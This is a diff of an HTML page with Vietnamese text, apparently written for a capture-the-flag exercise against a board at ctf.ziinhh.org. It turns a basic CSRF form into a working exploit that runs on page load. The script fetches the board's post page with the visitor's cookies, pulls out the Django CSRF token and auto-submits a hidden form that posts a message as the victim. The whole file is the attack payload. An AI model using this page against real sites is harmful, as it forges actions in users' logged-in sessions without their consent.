@@ -1,13 +1,88 @@
-<h3>Please wait...</h3>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>HUH, gì vậy ?</title>
+  </head>
+  <body>
+    <h3>Có chi mô mà đọc em</h3>
+    <pre id="log"></pre>
 
-<form action="http://ctf.ziinhh.org/boards/3/new/" method="POST">
-  <input
-    type="hidden"
-    name="csrfmiddlewaretoken"
-    value="tPRjw3jk8BWxfW2tGmWQjOQEJj2uOm7BCcLqnFx46m50105lZje4Iq7E1YPJsyxF"
-  />
+    <script>
+      const BASE = window.location.origin; // phải là http://ctf.ziinhh.org khi chạy
+      const GET_PATH = "/boards/3/new/";
+      const POST_URL = BASE + "/boards/3/new/"; // action full URL
 
-  <input type="hidden" name="subject" value="Đã bị CSRF" />
+      function log(...args) {
+        const p = document.getElementById("log");
+        p.textContent += args.join(" ") + "\n";
+        // console.log(...args);
+      }
 
-  <input type="hidden" name="message" value="Có cái gì đó, ai biết mô" />
-</form>
+      // parse token từ HTML string
+      function parseCsrfFromHtml(htmlText) {
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(htmlText, "text/html");
+        const el = doc.querySelector('input[name="csrfmiddlewaretoken"]');
+        return el ? el.value : null;
+      }
+
+      (async function () {
+        try {
+          // log("Gửi GET", BASE + GET_PATH);
+          const resp = await fetch(BASE + GET_PATH, {
+            method: "GET",
+            credentials: "include",
+          });
+          if (!resp.ok) {
+            // log("GET lỗi:", resp.status);
+            return;
+          }
+          const html = await resp.text();
+          // log("GET OK, length:", html.length);
+
+          const token = parseCsrfFromHtml(html);
+          log("Token lấy được:", token);
+
+          if (!token) {
+            // log("Không tìm thấy csrfmiddlewaretoken trong HTML trả về.");
+            return;
+          }
+
+          // tạo form DOM (khi submit bằng form, browser sẽ gửi như request bạn muốn)
+          const form = document.createElement("form");
+          form.method = "POST";
+          form.action = POST_URL;
+          form.style.display = "none";
+
+          function addHidden(name, value) {
+            const inp = document.createElement("input");
+            inp.type = "hidden";
+            inp.name = name;
+            inp.value = value;
+            form.appendChild(inp);
+          }
+
+          addHidden("csrfmiddlewaretoken", token);
+          addHidden("subject", "Ủa, mình có đăng à ta?");
+          addHidden("message", "Có cái gì đó, ai biết mô");
+
+          document.body.appendChild(form);
+
+          // delay ngắn để bạn kẹp proxy/interceptor nếu cần
+          // log("Form đã tạo, submit sau 1.5s ...");
+          setTimeout(() => {
+            try {
+              form.submit();
+              // log("Form submitted.");
+            } catch (e) {
+              // log("Submit lỗi:", e && e.message ? e.message : e);
+            }
+          }, 1500);
+        } catch (e) {
+          // log("Lỗi:", e && e.message ? e.message : e);
+        }
+      })();
+    </script>
+  </body>
+</html>
